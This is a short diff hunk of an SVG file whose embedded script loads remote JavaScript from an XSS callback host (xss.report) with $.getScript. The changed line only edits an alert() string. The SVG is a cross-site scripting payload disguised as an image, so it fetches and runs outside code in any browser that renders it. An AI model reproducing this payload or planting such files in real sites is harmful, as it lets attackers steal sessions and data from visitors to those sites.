@@ -11,7 +11,7 @@ xml:space="preserve">
 <!-- Script linked from the outside-->     
 <script>$.getScript("//xss.report/c/kanak654")</script>      
 //<![CDATA[         
-alert("0xkanak");       
+alert("nagaxor");       
 ]]>     
 </script>   
 </svg>
